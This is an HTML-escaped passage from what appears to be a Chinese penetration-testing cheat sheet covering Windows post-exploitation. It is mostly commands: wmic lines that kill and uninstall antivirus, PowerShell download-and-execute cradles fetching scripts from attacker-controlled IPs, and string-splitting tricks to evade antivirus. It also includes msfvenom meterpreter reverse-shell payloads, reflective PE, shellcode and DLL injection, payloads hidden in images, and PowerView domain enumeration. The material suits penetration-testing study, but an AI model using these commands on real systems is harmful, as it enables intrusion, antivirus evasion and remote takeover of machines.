class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create calc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;C:\\shell.exe\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;结束进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;shell.exe\&quot; call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where processid=\&quot;2345\&quot; delete&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process 2345 call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief 列出自启动程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic netuse list brief 列出共享驱动盘&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic ntdomain list brief 查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic useraccount list brief 列出本机管理员及SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic qfe list brief 列出补丁列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic share get name,path 查看共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief查看启动项&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product get name,version 查看安装的软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;powershell基础操作\&quot;&gt;Powershell基础操作&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#powershell基础操作\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看版本$PSVersionTable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;远程执行&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -nop -w hidden -ep bypass \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;加载exe&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom生成exe木马&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe  /var/www/html/1.exe  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用powersploit的Invoke-ReflectivePEInjection.ps1脚本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe -w hidden -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR\&quot; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;EXE2PS1&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将exe转换为base64&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Import-Module .\\Convert-BinaryToString.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Convert-BinaryToString -FilePath .\\ms15051.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-ReflectivePEInjection.ps1文件头部添加&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Function MS15051{&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&amp;#x3C;#&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.SYNOPSIS    &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.EXAMPLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;C:\\PS MS15051 -Command \&quot;whoami\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt; [CmdletBinding()]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    param(&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        [Parameter(Mandatory = $False)]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        [string]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;        $Command&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  )&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$InputString = \&quot;文件的base64编码\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$PEBytes = [System.Convert]::FromBase64String($InputString)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;文件尾部添加&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;write-host (\&quot;[+] Executing Command: \&quot;+$Command)  -foregroundcolor \&quot;Green\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;write-host (\&quot;[+] Done !\&quot;)  -foregroundcolor \&quot;Green\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;远程下载执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -nop -w hidden -ep bypass \&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \\\&quot;whoami\\\&quot;\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;绕过策略&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -File ./a.ps1&amp;#x26;Import-Module xxx&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;Base64&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use exploit/multi/script/web_delivery|target=2(PSH)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&amp;#x26;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat payload.txt | iconv --to-code UTF-16LE |base64&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -ep bypass -enc base64code&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;写入bat绕过&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -File ./a.ps1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将该命令保存为c.bat&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;拼接拆分字符串&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell.exe  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c1=&#39;powershell -c IEX&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;$c3=&#39;adString(\&quot;http://192.168.197.192/a.ps1\&quot;)&#39;; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo ($c1,$c2,$c3) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;\&quot; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;Replace替换函数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -noexit \&quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)\&quot; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;HTTP字符拼接绕过&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;也可以对http字符进行绕过，同样可以bypass&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell \&quot;$a=&#39;IEX((new-object net.webclient).downloadstring(\&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1\&quot;))&#39;;IEX ($a+$b)\&quot;  &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;图片免杀&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/peewpw/Invoke-PSImage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1900*1200的图片x.jpg。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;C:\\powershell &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS C:\\ Import-Module .\\Invoke-PSImage.ps1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS C:\\ Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;加载shellcode&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom生成脚本木马&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;在windows靶机上运行一下命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://192.168.72.164/test\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-Shellcode -Shellcode $buf -Force  运行木马 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用Invoke-Shellcode.ps1脚本执行shellcode&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;即可反弹meterpreter shell&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;加载dll&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用msfvenom 生成dll木马脚本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将生成的dll上传到目标的C盘。在靶机上执行以下命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Start-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建新的进程启动记事本，并设置为隐藏&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Msf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;powerview\&quot;&gt;Powerview&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#powerview\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取当前域信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Get-NetDomain}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/302.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; get-netforest}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/303.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Invoke-EnumerateLocalAdmin}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/304.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询管理在线的机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-userhunter}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/305.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span 